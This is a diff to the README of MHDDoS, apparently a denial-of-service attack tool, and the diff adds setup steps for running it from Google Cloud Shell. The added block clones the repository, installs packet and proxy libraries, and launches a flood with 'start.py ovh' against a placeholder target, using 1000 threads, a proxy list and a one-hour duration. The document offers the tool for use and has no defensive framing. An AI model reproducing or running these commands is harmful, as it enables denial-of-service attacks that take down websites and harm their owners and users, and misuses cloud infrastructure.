@@ -135,6 +135,26 @@ You can download it from [GitHub Releases](https://github.com/LowkeySen/MHDDoS/r
 
 You can read it from [GitHub Wiki](https://github.com/LowkeySen/MHDDoS/wiki)
 
+**Google Shell**
+
+```shell script
+https://shell.cloud.google.com/
+```
+**Google Shell**
+
+```cd line up
+ls
+git clone https://github.com/LowkeySen/MHDDoS.git
+ls
+cd MHDDoS/ 
+pip install -r requirements.txt
+ls
+pip3 install icmplib requests pysocks cfscrape scapy
+python3 start.py
+python3 start.py ovh https://exampletarget.com/ 1 1000 http.txt 61 3600
+```
+
+---
 **Clone and Install Script**
 
 ```shell script
@@ -142,6 +162,7 @@ git clone https://github.com/LowkeySen/MHDDoS.git
 cd MHDDoS
 pip install -r requirements.txt
 ```
+
 
 **One-Line Installing on Fresh VPS**
 
